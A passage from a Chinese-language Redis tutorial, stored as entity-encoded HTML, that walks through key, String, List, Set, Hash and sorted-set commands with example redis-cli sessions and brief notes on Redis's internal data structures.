3) &quot;k1&quot;
# exists key =&gt; &#x5224;&#x65AD; key &#x662F;&#x5426;&#x5B58;&#x5728; -&gt; 1 &#x5B58;&#x5728;; 0&#x4E0D;&#x5B58;&#x5728;
127.0.0.1:6379&gt; exists k1
(integer) 1
# type key =&gt; &#x67E5;&#x770B; key &#x662F;&#x4EC0;&#x4E48;&#x7C7B;&#x578B;
127.0.0.1:6379&gt; type k1
string
# del key =&gt; &#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684; key &#x6570;&#x636E;
127.0.0.1:6379&gt; del k3
(integer) 1
# expire key 10 =&gt; &#x4E3A;&#x7ED9;&#x5B9A;&#x7684; key &#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4; -- &#x79D2;
127.0.0.1:6379&gt; expire k2 10
(integer) 1
# ttl key =&gt; &#x67E5;&#x770B;&#x8FD8;&#x6709;&#x591A;&#x5C11;&#x79D2;&#x8FC7;&#x671F; -&gt; -1 &#x6C38;&#x4E0D;&#x8FC7;&#x671F;; -2 &#x5DF2;&#x8FC7;&#x671F;
127.0.0.1:6379&gt; ttl k2
(integer) -2
# unlink key =&gt; &#x6839;&#x636E; value &#x9009;&#x62E9;&#x975E;&#x963B;&#x585E;&#x5220;&#x9664;, &#x5373;&#x5F02;&#x6B65;&#x5220;&#x9664;
127.0.0.1:6379&gt; unlink k2
(integer) 0
# select =&gt; &#x5207;&#x6362;&#x6570;&#x636E;&#x5E93;
select 0
# dbsize =&gt; &#x67E5;&#x770B;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684; key &#x6570;&#x91CF;
127.0.0.1:6379&gt; dbsize
(integer) 1
# flushdb =&gt; &#x6E05;&#x7A7A;&#x5F53;&#x524D;&#x5E93;
127.0.0.1:6379&gt; flushdb
OK
# flushall =&gt; &#x901A;&#x6740;&#x5168;&#x90E8;&#x5E93; =&gt; &#x614E;&#x7528;
</code></pre>
<ul>
<li>String &#x5B57;&#x7B26;&#x4E32;</li>
</ul>
<p>String &#x662F; Redis &#x6700;&#x57FA;&#x672C;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E0E; Memcached &#x4E00;&#x6837;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x4E00;&#x4E2A; Key &#x5BF9;&#x5E94;&#x4E00;&#x4E2A; Value&#x3002;String &#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x5373; Redis &#x7684; String &#x53EF;&#x4EE5;&#x5305;&#x542B;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x56FE;&#x7247;&#x6216;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#x3002;Redis &#x4E2D;&#x5B57;&#x7B26;&#x4E32; Value &#x6700;&#x591A;&#x53EF;&#x4EE5;&#x662F; 512M&#x3002;</p>
<p>&#x7F51;&#x7AD9;&#x9875;&#x9762;&#x8BBF;&#x95EE;&#x91CF; PageView PV &#x53EF;&#x4F7F;&#x7528; Redis &#x7684; incr&#x3001;incrby &#x5B9E;&#x73B0;&#x3002;</p>
<pre><code class="language-shell"># set &lt;Key&gt; &lt;Value&gt; =&gt; &#x8BBE;&#x7F6E; Key-Value
127.0.0.1:6379&gt; set k1 v100
OK
127.0.0.1:6379&gt; set k2 v200
OK
# get &lt;Key&gt; =&gt; &#x67E5;&#x8BE2; Key &#x503C;
127.0.0.1:6379&gt; get k1
&quot;v100&quot;
127.0.0.1:6379&gt; get k2
&quot;v200&quot;
# append &lt;Key&gt; &lt;Value&gt; =&gt; &#x5C06;&#x7ED9;&#x5B9A;&#x7684; Value &#x8FFD;&#x52A0;&#x5230;&#x539F;&#x503C;&#x672B;&#x5C3E;
127.0.0.1:6379&gt; append k1 123
(integer) 7
127.0.0.1:6379&gt; get k1
&quot;v100123&quot;
# strlen &lt;Key&gt; =&gt; &#x83B7;&#x53D6;&#x503C;&#x7684;&#x957F;&#x5EA6;
127.0.0.1:6379&gt; strlen k1
(integer) 7
# setnx &lt;Key&gt; &lt;Value&gt; =&gt; &#x53EA;&#x6709;&#x5728; Key &#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65F6;&#x5019;&#x8BBE;&#x7F6E; Key &#x503C;
127.0.0.1:6379&gt; setnx k1 123
(integer) 0
127.0.0.1:6379&gt; setnx k3 v333
(integer) 1
# incr &lt;Key&gt; =&gt; &#x5C06; Key &#x503C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x5B57;&#x589E;1 -&gt; &#x5982;&#x679C;&#x4E3A;&#x7A7A;&#x5219;&#x65B0;&#x589E;&#x503C;&#x4E3A;1
127.0.0.1:6379&gt; set k4 444
OK
127.0.0.1:6379&gt; incr k4
(integer) 445
# decr &lt;Key&gt; =&gt; &#x5C06; Key &#x503C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x5B57;&#x51CF;1 -&gt; &#x5982;&#x679C;&#x4E3A;&#x7A7A;&#x5219;&#x65B0;&#x589E;&#x503C;&#x4E3A;1
127.0.0.1:6379&gt; decr k4
(integer) 444
# incrby/decrby &lt;Key&gt; &lt;&#x6B65;&#x957F;&gt; =&gt; &#x5C06; Key &#x503C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x5B57;&#x589E;&#x51CF;&#x6B65;&#x957F;
127.0.0.1:6379&gt; incrby k4 10
(integer) 454
</code></pre>
<blockquote>
<p>&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#x6307;&#x7684;&#x662F;&#x5E76;&#x4E0D;&#x4F1A;&#x88AB;&#x7EBF;&#x7A0B;&#x8C03;&#x5EA6;&#x673A;&#x5236;&#x6253;&#x65AD;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6B64;&#x64CD;&#x4F5C;&#x4E00;&#x65E6;&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4E00;&#x76F4;&#x8FD0;&#x884C;&#x5230;&#x7ED3;&#x675F;&#xFF0C;&#x4E2D;&#x95F4;&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55; context switch &#x5207;&#x6362;&#x5230;&#x53E6;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x3002;&#x5728;&#x5355;&#x7EBF;&#x7A0B;&#x4E2D;&#xFF0C;&#x80FD;&#x5728;&#x5355;&#x6761;&#x6307;&#x4EE4;&#x4E2D;&#x5B8C;&#x6210;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x53EF;&#x770B;&#x4F5C;&#x4E3A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x7EC8;&#x7AEF;&#x53EA;&#x80FD;&#x53D1;&#x751F;&#x4E8E;&#x6307;&#x4EE4;&#x4E4B;&#x95F4;&#x3002;&#x591A;&#x7EBF;&#x7A0B;&#x4E2D;&#x53EF;&#x80FD;&#x4F1A;&#x5B58;&#x5728;&#x6709;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x5373;&#x4E0D;&#x88AB;&#x5176;&#x4ED6;&#x8FDB;&#x7A0B;&#x6253;&#x65AD;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x9762;&#x8BD5;&#x9898;&#xFF1A;Java &#x4E2D;&#x7684; i++ &#x662F;&#x5426;&#x4E3A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF1F;&#x82E5; i=0&#xFF0C;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#x5206;&#x522B;&#x5BF9; i &#x8FDB;&#x884C; ++100 &#x64CD;&#x4F5C;&#xFF0C;&#x7ED3;&#x679C;&#x662F;&#xFF1F;&#x5426;&#xFF1B;Java &#x662F;&#x591A;&#x7EBF;&#x7A0B;&#xFF0C;&#x6545; i++ &#x5E76;&#x975E;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF1B;&#x6700;&#x7EC8;&#x8303;&#x56F4;&#x662F; 2-200&#x3002;</p>
</blockquote>
<pre><code class="language-shell">127.0.0.1:6379&gt; flushdb
OK
127.0.0.1:6379&gt; keys *
(empty array)
# mset &lt;Key&gt; &lt;Value&gt; &lt;Key&gt; &lt;Value&gt;... =&gt; &#x540C;&#x65F6;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A; Key-Value
127.0.0.1:6379&gt; mset k1 v1 k2 v2 k3 v3
OK
127.0.0.1:6379&gt; keys *
1) &quot;k3&quot;
2) &quot;k2&quot;
3) &quot;k1&quot;
# mget &lt;Key&gt; &lt;Key&gt;... =&gt; &#x540C;&#x65F6;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A; Value
127.0.0.1:6379&gt; mget k1 k2 k3
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;v3&quot;
# msetnx &lt;Key&gt; &lt;Value&gt; &lt;Key&gt; &lt;Value&gt;.. =&gt; &#x540C;&#x65F6;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A; Key-Value -&gt; &#x5F53;&#x4E14;&#x4EC5;&#x5F53;&#x6240;&#x6709;&#x7ED9;&#x5B9A; Key &#x90FD;&#x4E0D;&#x5B58;&#x5728;
127.0.0.1:6379&gt; msetnx k4 v4 k5 v5
(integer) 1
# getrange &lt;Key&gt; &lt;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&gt; &lt;&#x7ED3;&#x675F;&#x4F4D;&#x7F6E;&gt; =&gt; &#x83B7;&#x53D6; Key &#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x548C;&#x7ED3;&#x675F;&#x4F4D;&#x7F6E;&#x7684;&#x503C;
127.0.0.1:6379&gt; set user zairesinatra
OK
127.0.0.1:6379&gt; getrange user 0 4
&quot;zaire&quot;
# setrange &lt;Key&gt; &lt;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&gt; &lt;Value&gt; =&gt; &#x5C06; Value &#x7684;&#x503C;&#x8986;&#x76D6;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;
127.0.0.1:6379&gt; setrange user 12 -zszy
(integer) 17
127.0.0.1:6379&gt; get user
&quot;zairesinatra-zszy&quot;
# setex &lt;Key&gt; &lt;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&gt; &lt;Value&gt; =&gt; &#x8BBE;&#x7F6E;&#x952E;&#x503C;&#x7684;&#x540C;&#x65F6;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;
127.0.0.1:6379&gt; setex age 10 22
OK
127.0.0.1:6379&gt; ttl age
(integer) 6
# getset &lt;Key&gt; &lt;Value&gt; =&gt; &#x8BBE;&#x7F6E;&#x65B0;&#x503C;&#x540C;&#x65F6;&#x83B7;&#x5F97;&#x65E7;&#x503C;
127.0.0.1:6379&gt; getset user zszy
&quot;zairesinatra-zszy&quot;
127.0.0.1:6379&gt; get user
&quot;zszy&quot;
</code></pre>
<ul>
<li>List &#x5217;&#x8868;</li>
</ul>
<p>&#x5728;&#x7248;&#x672C; 3.2 &#x4E4B;&#x524D;&#xFF0C;Redis &#x5217;&#x8868; List &#x4F7F;&#x7528;&#x538B;&#x7F29;&#x5217;&#x8868; Ziplist &#x548C;&#x53CC;&#x5411;&#x94FE;&#x8868; Linkedlist &#x4F5C;&#x4E3A;&#x5E95;&#x5C42;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x7248;&#x672C; 3.2 &#x4E4B;&#x540E;&#xFF0C;Redis &#x91C7;&#x7528;&#x5FEB;&#x901F;&#x5217;&#x8868; Quicklist&#xFF0C;&#x5373;&#x4EE5;&#x538B;&#x7F29;&#x5217;&#x8868; Ziplist &#x4E3A;&#x8282;&#x70B9;&#x7684;&#x94FE;&#x8868; Linkedlist&#x3002;</p>
<p>&#x5728;&#x5217;&#x8868;&#x5143;&#x7D20;&#x8F83;&#x5C11;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F7F;&#x7528;&#x4E00;&#x5757;&#x8FDE;&#x7EED;&#x7684;&#x5185;&#x5B58;&#x5B58;&#x50A8;&#xFF0C;&#x8FD9;&#x4E2A;&#x7ED3;&#x6784;&#x662F; ziplist&#xFF0C;&#x5373;&#x538B;&#x7F29;&#x5217;&#x8868;&#x3002;&#x5F53;&#x6570;&#x636E;&#x91CF;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x6539;&#x6210; quicklist&#x3002;&#x56E0;&#x666E;&#x901A;&#x94FE;&#x8868;&#x7684;&#x9644;&#x52A0;&#x6307;&#x9488; prev &#x548C; next &#x7A7A;&#x95F4;&#x592A;&#x5927;&#xFF0C;&#x8F83;&#x4E3A;&#x6D6A;&#x8D39;&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; flushdb
OK
# lpush/rpush &lt;Key&gt; &lt;Value&gt; &lt;Value&gt;... =&gt; &#x4ECE;&#x5DE6;&#x6216;&#x53F3;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x503C;
127.0.0.1:6379&gt; lpush k1 v1 v11 v111
(integer) 3
# lrange key 0 -1 =&gt; &#x83B7;&#x53D6;&#x6240;&#x6709;&#x503C;
127.0.0.1:6379&gt; lrange k1 0 -1
1) &quot;v111&quot;
2) &quot;v11&quot;
3) &quot;v1&quot;
# lpop/rpop key =&gt; &#x4ECE;&#x5DE6;&#x6216;&#x8005;&#x53F3;&#x5410;&#x51FA;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x503C; -&gt; &#x503C;&#x5728;&#x952E;&#x5728;
127.0.0.1:6379&gt; lpop k1
&quot;v111&quot;
# rpoplpush &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x4ECE; Key1 &#x5217;&#x8868;&#x53F3;&#x8FB9;&#x5410;&#x51FA;&#x4E00;&#x4E2A;&#x503C;&#x63D2;&#x5165;&#x5230; Key2 &#x7684;&#x5DE6;&#x8FB9;
127.0.0.1:6379&gt; rpush k2 v2 v22
(integer) 2
127.0.0.1:6379&gt; rpoplpush k1 k2
&quot;v1&quot;
lrange key start stop =&gt; &#x6309;&#x7167;&#x7D22;&#x5F15;&#x4E0B;&#x6807;&#x83B7;&#x53D6;&#x5143;&#x7D20; -&gt; &#x4ECE;&#x5DE6;&#x5230;&#x53F3;
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;v22&quot;
# lindex &lt;Key&gt; &lt;Index&gt; =&gt; &#x6309;&#x7167;&#x7D22;&#x5F15;&#x4E0B;&#x6807;&#x83B7;&#x5F97;&#x5143;&#x7D20;
127.0.0.1:6379&gt; lindex k2 0
&quot;v1&quot;
# llen &lt;Key&gt; =&gt; &#x83B7;&#x53D6;&#x5217;&#x8868;&#x957F;&#x5EA6;
127.0.0.1:6379&gt; llen k2
(integer) 3
# linsert key before/after value newvalue =&gt; &#x5728;value&#x7684;&#x524D;&#x9762;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x65B0;&#x503C;
127.0.0.1:6379&gt; linsert k2 before &quot;v22&quot; &quot;newv22&quot;
(integer) 4
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;newv22&quot;
4) &quot;v22&quot;
# lrem key &lt;n&gt; &lt;Value&gt; =&gt; &#x4ECE;&#x5DE6;&#x8FB9;&#x5220;&#x9664; n &#x4E2A; Value &#x503C;
127.0.0.1:6379&gt; lrem k2 1 newv22
(integer) 1
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;v22&quot;
# lset key index value =&gt; &#x5728;&#x5217;&#x8868; Key &#x4E2D;&#x7684;&#x4E0B;&#x6807; Index &#x4E2D;&#x4FEE;&#x6539;&#x503C; Value
127.0.0.1:6379&gt; lset k2 1 zsv11
OK
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;zsv11&quot;
3) &quot;v22&quot;
</code></pre>
<ul>
<li>Set &#x96C6;&#x5408;</li>
</ul>
<p>Redis &#x7684; Set &#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x7684;&#x529F;&#x80FD;&#x4E0E;&#x5217;&#x8868; List &#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x524D;&#x8005;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x6392;&#x91CD;&#x3002;&#x4E14; Set &#x63D0;&#x4F9B;&#x5224;&#x65AD;&#x67D0;&#x4E2A;&#x6210;&#x5458;&#x662F;&#x5426;&#x5728;&#x4E00;&#x4E2A; Set &#x96C6;&#x5408;&#x5185;&#x7684;&#x91CD;&#x8981;&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x4E5F;&#x662F; List &#x6240;&#x6CA1;&#x6709;&#x7684;&#x3002;</p>
<p>Redis &#x7684; Set &#x662F; String &#x7C7B;&#x578B;&#x7684;&#x65E0;&#x5E8F;&#x96C6;&#x5408;&#xFF0C;&#x5176;&#x5E95;&#x5C42;&#x662F; value &#x4E3A; null &#x7684; Hash &#x7ED3;&#x6784;&#xFF0C;&#x6240;&#x6709;&#x7684; value &#x90FD;&#x6307;&#x5411;&#x540C;&#x4E00;&#x4E2A;&#x5185;&#x90E8;&#x503C;&#x3002;&#x6545;&#x6DFB;&#x52A0;&#xFF0C;&#x5220;&#x9664;&#xFF0C;&#x67E5;&#x627E;&#x7684;&#x590D;&#x6742;&#x5EA6;&#x90FD;&#x662F; O (1)&#x3002;</p>
<pre><code class="language-shell"># sadd &lt;Key&gt; &lt;Value1&gt; &lt;Value2&gt;... =&gt; &#x5C06;&#x4E00;&#x6216;&#x591A;&#x4E2A; member &#x5143;&#x7D20;&#x6DFB;&#x52A0;&#x5230;&#x96C6;&#x5408; Key &#x4E2D;&#x5E76;&#x5FFD;&#x7565;&#x5DF2;&#x5B58;&#x5728;&#x7684; member
127.0.0.1:6379&gt; sadd k1 v1 v2 v3
(integer) 3
# smembers &lt;Key&gt; =&gt; &#x53D6;&#x51FA;&#x8BE5;&#x96C6;&#x5408;&#x7684;&#x6240;&#x6709;&#x503C;
127.0.0.1:6379&gt; smembers k1
1) &quot;v1&quot;
2) &quot;v3&quot;
3) &quot;v2&quot;
# sismember &lt;Key&gt; &lt;Value&gt; =&gt; &#x5224;&#x65AD;&#x8BE5;&#x96C6;&#x5408; Key &#x662F;&#x5426;&#x542B;&#x6709;&#x8BE5;&#x503C;
127.0.0.1:6379&gt; sismember k1 v1
(integer) 1
# scard &lt;Key&gt; =&gt; &#x8FD4;&#x56DE;&#x8BE5;&#x96C6;&#x5408;&#x7684;&#x5143;&#x7D20;&#x4E2A;&#x6570;
127.0.0.1:6379&gt; scard k1
(integer) 3
# srem &lt;Key&gt; &lt;Value&gt; &lt;Value&gt; =&gt; &#x5220;&#x9664;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x5143;&#x7D20;
127.0.0.1:6379&gt; srem k1 v1 v2
(integer) 2
# spop &lt;Key&gt; =&gt; &#x968F;&#x673A;&#x4ECE;&#x96C6;&#x5408;&#x4E2D;&#x53D6;&#x51FA;&#x4E00;&#x4E2A;&#x5143;&#x7D20;
127.0.0.1:6379&gt; spop k1
&quot;v3&quot;
# srandmember &lt;Key&gt; n =&gt; &#x968F;&#x5373;&#x4ECE;&#x8BE5;&#x96C6;&#x5408;&#x4E2D;&#x53D6;&#x51FA; n &#x4E2A;&#x503C;, &#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x4ECE;&#x96C6;&#x5408;&#x4E2D;&#x5220;&#x9664;
srandmember k1 2
1) &quot;v1&quot;
2) &quot;v3&quot;
# smove &lt;Key1&gt; &lt;Key2&gt; &lt;Value&gt; =&gt; &#x5C06;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x67D0;&#x4E2A; Value &#x79FB;&#x52A8;&#x5230;&#x53E6;&#x4E00;&#x4E2A;&#x96C6;&#x5408;
127.0.0.1:6379&gt; sadd k2 v3 v4 v5
(integer) 3
127.0.0.1:6379&gt; smove k1 k2 v3
(integer) 1
127.0.0.1:6379&gt; smembers k1
1) &quot;v1&quot;
2) &quot;v2&quot;
127.0.0.1:6379&gt; smembers k2
1) &quot;v5&quot;
2) &quot;v3&quot;
3) &quot;v4&quot;
# sinter &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x4EA4;&#x96C6;&#x5143;&#x7D20;
127.0.0.1:6379&gt; sadd k3 v4 v6 v7
(integer) 3
127.0.0.1:6379&gt; sinter k2 k3
1) &quot;v4&quot;
# sunion &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x5E76;&#x96C6;&#x5143;&#x7D20;
127.0.0.1:6379&gt; sunion k2 k3
1) &quot;v3&quot;
2) &quot;v4&quot;
3) &quot;v5&quot;
4) &quot;v7&quot;
5) &quot;v6&quot;
# sdiff &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x5DEE;&#x96C6;&#x5143;&#x7D20; -&gt; Key1 &#x4E2D;&#x7684;&#x4E0D;&#x5728; Key2 &#x4E2D;&#x7684;
127.0.0.1:6379&gt; sdiff k2 k3
1) &quot;v5&quot;
2) &quot;v3&quot;
</code></pre>
<ul>
<li>Hash &#x54C8;&#x5E0C;</li>
</ul>
<p>Redis Hash &#x662F;&#x4E00;&#x4E2A; String &#x7C7B;&#x578B;&#x7684; field &#x548C; value &#x7684;&#x6620;&#x5C04;&#x8868;&#xFF0C;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x9002;&#x5408;&#x5B58;&#x50A8;&#x5BF9;&#x8C61;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x96C6;&#x5408;&#x3002;</p>
<pre><code class="language-shell"># hset &lt;Key&gt; &lt;Field&gt; &lt;Value&gt; =&gt; &#x7ED9; Key &#x96C6;&#x5408;&#x4E2D;&#x7684; Field &#x952E;&#x8D4B;&#x503C; Value
127.0.0.1:6379&gt; hset user:1001 id 1
(integer) 1
127.0.0.1:6379&gt; hset user:1001 name zs
(integer) 1
# hget &lt;Key1&gt; &lt;Field&gt; =&gt; &#x96C6;&#x5408; Field &#x53D6;&#x51FA; Value
127.0.0.1:6379&gt; hget user:1001 id
&quot;1&quot;
127.0.0.1:6379&gt; hget user:1001 name
&quot;zs&quot;
# hmset &lt;Key1&gt; &lt;Field1&gt; &lt;Value1&gt; &lt;Field2&gt; &lt;Value2&gt; =&gt; &#x6279;&#x91CF;&#x8BBE;&#x7F6E; Hash &#x7684;&#x503C;
127.0.0.1:6379&gt; hmset user:1002 id 2 name gz
OK
# hexists &lt;Key&gt; &lt;Field&gt; =&gt; &#x67E5;&#x770B;&#x54C8;&#x5E0C;&#x8868; Key &#x4E2D;&#x7ED9;&#x5B9A;&#x57DF; Field &#x662F;&#x5426;&#x5B58;&#x5728;
127.0.0.1:6379&gt; hexists user:1002 name
(integer) 1
# hkeys &lt;Key&gt; =&gt; &#x5217;&#x51FA;&#x8BE5; Hash &#x96C6;&#x5408;&#x7684;&#x6240;&#x6709; Field
127.0.0.1:6379&gt; hkeys user:1002
1) &quot;id&quot;
2) &quot;name&quot;
# hvals &lt;Key&gt; =&gt; &#x5217;&#x51FA;&#x8BE5; Hash &#x96C6;&#x5408;&#x7684;&#x6240;&#x6709; Value
127.0.0.1:6379&gt; hvals user:1002
1) &quot;2&quot;
2) &quot;gz&quot;
# hincrby &lt;Key&gt; &lt;Field&gt; increment =&gt; &#x4E3A;&#x54C8;&#x5E0C;&#x8868; Key &#x4E2D;&#x7684;&#x57DF; Field &#x7684;&#x503C;&#x52A0;&#x4E0A;&#x589E;&#x91CF;
127.0.0.1:6379&gt; hincrby user:1002 id 1
(integer) 3
# hsetnx &lt;Key&gt; &lt;Field&gt; &lt;Value&gt; =&gt; &#x5C06;&#x54C8;&#x5E0C;&#x8868; Key &#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x57DF; Field &#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A; Value
127.0.0.1:6379&gt; hsetnx user:1002 age 22
(integer) 1
127.0.0.1:6379&gt; hkeys user:1002
1) &quot;id&quot;
2) &quot;name&quot;
3) &quot;age&quot;
</code></pre>
<p>Hash &#x7C7B;&#x578B;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x662F; ziplist &#x538B;&#x7F29;&#x5217;&#x8868;&#x3001;hashtable &#x54C8;&#x5E0C;&#x8868;&#x3002;&#x5F53; field-value &#x957F;&#x5EA6;&#x8F83;&#x77ED;&#x4E14;&#x4E2A;&#x6570;&#x8F83;&#x5C11;&#x65F6;&#xFF0C;&#x4F7F;&#x7528; ziplist&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528; hashtable&#x3002;</p>
<ul>
<li>SortedSet Zset &#x6709;&#x5E8F;&#x96C6;&#x5408;</li>
</ul>
<p>Redis zset &#x6709;&#x5E8F;&#x96C6;&#x5408;&#x662F;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x91CD;&#x590D;&#x5143;&#x7D20;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x96C6;&#x5408;&#xFF0C;&#x5176;&#x5185;&#x6BCF;&#x4E2A;&#x6210;&#x5458;&#x90FD;&#x5173;&#x8054;&#x4E86;&#x4E00;&#x4E2A;&#x8BC4;&#x5206; Score&#xFF0C;&#x8FD9;&#x4E2A;&#x8BC4;&#x5206; Score &#x88AB;&#x7528;&#x6765;&#x6309;&#x7167;&#x987A;&#x5E8F;&#x6392;&#x5E8F;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6210;&#x5458;&#x3002;&#x6210;&#x5458;&#x552F;&#x4E00;&#xFF0C;&#x4F46;&#x8BC4;&#x5206;&#x53EF;&#x4EE5;&#x91CD;&#x590D;&#x3002;</p>
<p>zset &#x5E95;&#x5C42;&#x4F7F;&#x7528; hash &#x548C;&#x8DF3;&#x8DC3;&#x8868;&#x3002;&#x524D;&#x8005;&#x5173;&#x8054;&#x5143;&#x7D20; value &#x548C;&#x6743;&#x91CD; score&#xFF0C;&#x4FDD;&#x969C; value &#x7684;&#x552F;&#x4E00;&#x6027;&#xFF0C;&#x5E76;&#x80FD;&#x6839;&#x636E; value &#x627E;&#x5230;&#x76F8;&#x5E94;&#x7684; score &#x503C;&#x3002;&#x540E;&#x8005;&#x76EE;&#x7684;&#x7ED9; value &#x6392;&#x5E8F;&#xFF0C;&#x6839;&#x636E; score &#x7684;&#x8303;&#x56F4;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x5217;&#x8868;&#x3002;</p>
<pre><code class="language-shell"># zadd &lt;Key&gt; &lt;Score1&gt; &lt;Value1&gt; &lt;Score2&gt; &lt;Value2&gt; =&gt; &#x5C06;&#x4E00;&#x6216;&#x591A;&#x4E2A; member &#x5143;&#x7D20;&#x53CA;&#x5176; score &#x503C;&#x52A0;&#x5165;&#x5230;&#x6709;&#x5E8F; Key &#x4E2D;
127.0.0.1:6379&gt; zadd topn 2 java 3 cpp 4 node 5 php
(integer) 4
# zrange &lt;Key&gt; start stop (withscores) =&gt; &#x8FD4;&#x56DE;&#x6709;&#x5E8F;&#x96C6;key&#xFF0C;&#x4E0B;&#x6807;&#x5728;start&#x4E0E;stop&#x4E4B;&#x95F4;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5E26;withscores&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x5206;&#x6570;&#x4E00;&#x8D77;&#x548C;&#x503C;&#x8FD4;&#x56DE;&#x5230;&#x7ED3;&#x679C;&#x96C6;&#x3002;
127.0.0.1:6379&gt; zrange topn 0 -1
1) &quot;java&quot;
2) &quot;cpp&quot;
3) &quot;node&quot;
4) &quot;php&quot;
127.0.0.1:6379&gt; zrange topn 0 -1 withscores
1) &quot;java&quot;
2) &quot;2&quot;
3) &quot;cpp&quot;
4) &quot;3&quot;
5) &quot;node&quot;
6) &quot;4&quot;
7) &quot;php&quot;
8) &quot;5&quot;
# zrangebyscore &lt;Key&gt; min max (withscores) =&gt; &#x8FD4;&#x56DE;&#x6709;&#x5E8F;&#x96C6; Key -&gt; &#x6240;&#x6709; Score &#x503C;&#x4ECB;&#x4E8E; Min &#x548C; Max &#x4E4B;&#x95F4;&#x7684;&#x6210;&#x5458; -&gt; &#x4ECE;&#x5C0F;&#x5230;&#x5927;
127.0.0.1:6379&gt; zrangebyscore topn 3 5
1) &quot;cpp&quot;
2) &quot;node&quot;
3) &quot;php&quot;
# zrevrangebyscore &lt;Key&gt; max min (withscores) =&gt;  &#x8FD4;&#x56DE;&#x6709;&#x5E8F;&#x96C6; Key -&gt; &#x6240;&#x6709; Score &#x503C;&#x4ECB;&#x4E8E; Min &#x548C; Max &#x4E4B;&#x95F4;&#x7684;&#x6210;&#x5458; -&gt; &#x4ECE;&#x5927;&#x5230;&#x5C0F;
127.0.0.1:6379&gt; zrevrangebyscore topn 5 2
1) &quot;php&quot;
2) &quot;node&quot;
